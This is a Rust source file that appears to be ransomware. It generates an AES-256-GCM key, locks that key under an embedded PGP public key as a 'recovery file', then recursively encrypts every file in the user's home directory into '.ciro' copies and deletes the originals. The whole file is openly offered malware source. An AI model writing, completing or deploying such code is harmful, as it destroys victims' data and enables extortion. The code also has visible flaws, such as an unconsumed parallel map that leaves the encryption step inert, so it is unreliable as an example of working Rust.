use aes_gcm::{
    aead::{Aead, OsRng},
    AeadCore, Aes256Gcm, KeyInit,
};
use dirs2::{data_dir, home_dir};
use pgp::{
    composed::{Deserializable, MessageBuilder, SignedPublicKey},
    crypto::sym::SymmetricKeyAlgorithm,
};
use rayon::prelude::*;
use std::{
    fs::{read, read_dir, remove_file, File},
    io::{Error, Write},
    path::PathBuf,
};
use zeroize::Zeroize;

const PUB_KEY_STR: &str = r#"
-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEaNRDHBYJKwYBBAHaRw8BAQdAM8+crM87HecyVWi/k+a+0Vlkp4fEnpEkk2xg
KcizQzy0LEZpbGlwcG8gQmFnbGlvbmkgPGZpbG9iYWdsaW9uaS4wNkBwcm90b24u
bWU+iJYEExYKAD4WIQQq8+jcfYc6/q12JSDkSWtWixgznQUCaNRDHAIbAwUJBaOa
gAULCQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRDkSWtWixgznbMCAP4ug/jPqZ78
1iMctTSBYBF92TdmzorGCKlv+1InZg0zMwEA5/7F5/++YqUuIoVZb1eUvlrluc50
C1NT0TBzM1iN0AW4OARo1EMcEgorBgEEAZdVAQUBAQdA85zIyIKYuI1rRy9ozu1k
QdhcC6lqyCOUcWcsiMuAYCADAQgHiH4EGBYKACYWIQQq8+jcfYc6/q12JSDkSWtW
ixgznQUCaNRDHAIbDAUJBaOagAAKCRDkSWtWixgzna6bAP4yumlrKO/Xs1h3XLG8
UgUh300R5/gZlZUHlRNb04NypAD+N3v9KcO4uVzuKNJcjyYbwy3HX7vxR76F1Py0
JXRKgQk=
=Nkpc
-----END PGP PUBLIC KEY BLOCK-----
"#;

// List files function simply finds all files recursively inside a directory
fn list_files(dir: PathBuf) -> Result<Vec<PathBuf>, Error> {
    let mut files: Vec<PathBuf> = vec![];
    if dir.is_dir() {
        for entry in read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                files.extend(list_files(path)?);
            } else if let Some(ext) = path.extension() {
                if ext != "txt.key" {
                    files.push(path);
                }
            } else {
                files.push(path);
            }
        }
    }
    Ok(files)
}

// Main function of the program
fn main() {
    let dir = home_dir().expect("Could not open home directory");

    // Generate a cipher to encrypt files with aes2356 algorithm
    let mut key = Aes256Gcm::generate_key(OsRng);
    let cipher = Aes256Gcm::new(&key);

    // Create a recovery file inside data dir with the cipher key and nonce
    let (public_key, _) =
        SignedPublicKey::from_string(PUB_KEY_STR).expect("Could not read public key");

    let mut msg =
        MessageBuilder::from_bytes("", key.to_vec()).seipd_v1(OsRng, SymmetricKeyAlgorithm::AES256);

    msg.encrypt_to_key(OsRng, &public_key)
        .expect("recovery key encryption failure");

    let mut data_dir = data_dir().expect("Missing dara dir");
    data_dir.push("recovery_file");
    data_dir.set_extension("txt.key");
    let mut recovery_file = File::create(data_dir).expect("Failed to create recovery file");

    recovery_file
        .write_all(&msg.to_vec(OsRng).unwrap())
        .expect("recovery file written");

    // Listing all files recursively
    let files = list_files(dir.to_owned()).expect("Couldn't list files inside the directory");

    // Encryption
    let _ = files.into_par_iter().map(|file| {
        let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
        let content: Vec<u8> = read(&file).expect("read");
        let ciphertext: Vec<u8> = cipher
            .encrypt(&nonce, content.as_ref())
            .expect("encrypt text failure");

        // A new file with the encrypted content is created and the old one deleted
        let mut new_path = file.clone();
        if let Some(ext) = new_path.extension() {
            new_path.set_extension(format!("{:?}.ciro", ext));
        } else {
            new_path.set_extension("ciro");
        }
        let mut new_file = File::create(new_path).expect("file created");
        new_file.write_all(&nonce).expect("nonce written");
        new_file.write_all(&ciphertext).expect("text written");
        let _ = remove_file(file);
    });

    // Zeroing the key in memory
    key.zeroize();
}
